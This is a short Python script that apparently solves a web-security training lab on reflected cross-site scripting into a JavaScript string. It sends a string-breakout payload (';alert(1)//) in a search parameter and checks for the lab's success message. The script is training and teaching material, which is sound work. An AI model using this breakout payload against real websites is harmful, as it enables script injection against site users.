import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def xss_attack(url):
    # PREPARE PAYLOAD
    payload = "/?search=';alert(1)//"

    # PREPARE ARMED URL
    search_url = url + payload

    # ATTACK!
    requests.get(search_url, verify=False, proxies=proxies)

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    r = requests.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" not in r.text:
        print("[-] Exploit failed!")
        sys.exit(-1)
    print("[+] Web app vulnerable to reflected XSS. Exploit succeded!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1].strip()

    print("[+] ### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded")
    print("""[+] This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string.
    To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.""")

    xss_attack(url)

if __name__ == "__main__":
    main()